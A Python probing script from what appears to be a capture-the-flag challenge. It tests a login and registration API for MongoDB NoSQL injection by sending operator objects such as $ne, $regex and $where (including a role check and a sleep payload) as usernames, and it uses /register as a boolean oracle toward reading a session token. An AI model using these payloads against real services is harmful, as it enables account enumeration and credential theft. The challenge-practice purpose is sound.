#!/usr/bin/env python3
"""Is this Mongo, and do operator objects reach a query?

Recipe ids are 24-hex strings (ea45f529871d30dafb5ed353), i.e. MongoDB ObjectIds, so the
store is Mongo - and the previous run of this challenge never sent a single `$` operator
into a *filter*. It only tried `{"$ne": 1}` as a password, which cannot work because the
server bcrypts the supplied password before comparing, so the object never survives into
the query. The filters worth attacking instead are the ones built from `username`, which
/register and /login both look up *before* any hashing.

/register is a clean boolean oracle with no side effect: if the filter matches any stored
document the API answers 409 "taken", otherwise it creates the account. So
`{"username": {"$regex": "^c"}}` distinguishes "some username starts with c" from "none
does", and `{"$where": ...}` would extend that to arbitrary server-side predicates over
whole documents - which is how you read a chief's session token.
"""
import json
import sys
import time

from cc import Client, BASE


def w(s):
    sys.stdout.buffer.write((str(s) + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


def reg(username, password="zzzzzz"):
    c = Client()
    code, body, dt = c.post("/register", {"username": username, "password": password})
    return code, (body if isinstance(body, dict) else str(body)[:120]), round(dt, 2)


def log(username, password="wrongpassword"):
    c = Client()
    code, body, dt = c.post("/login", {"username": username, "password": password})
    return code, (body if isinstance(body, dict) else str(body)[:120]), round(dt, 2)


CASES = [
    ("plain absent", "zz_absent_qq"),
    ("plain existing-ish", "chief"),
    ("$ne trivially true", {"$ne": "zz_no_such_name"}),
    ("$regex any", {"$regex": "."}),
    ("$regex ^c", {"$regex": "^c"}),
    ("$regex ^zzzz", {"$regex": "^zzzz9"}),
    ("$exists true", {"$exists": True}),
    ("$in list", {"$in": ["chief", "inspector"]}),
    ("$not impossible", {"$not": {"$regex": "^zzzqq"}}),
    ("$where 1==1", {"$where": "1==1"}),
    ("$where role", {"$where": "this.role=='chief'"}),
    ("$where sleep", {"$where": "sleep(1200)||true"}),
]

if __name__ == "__main__":
    w("=== /register (409 = filter matched a document, 200 = matched none) ===")
    for label, val in CASES:
        code, body, dt = reg(val)
        w("  %-22s -> %s %ss %r" % (label, code, dt, body if not isinstance(body, dict)
                                    else {k: body[k] for k in list(body)[:2]}))
        time.sleep(0.5)
    w("=== /login (timing: absent ~0.27s, found ~0.4s) ===")
    for label, val in CASES[:9]:
        code, body, dt = log(val)
        w("  %-22s -> %s %ss %r" % (label, code, dt, body))
        time.sleep(0.5)
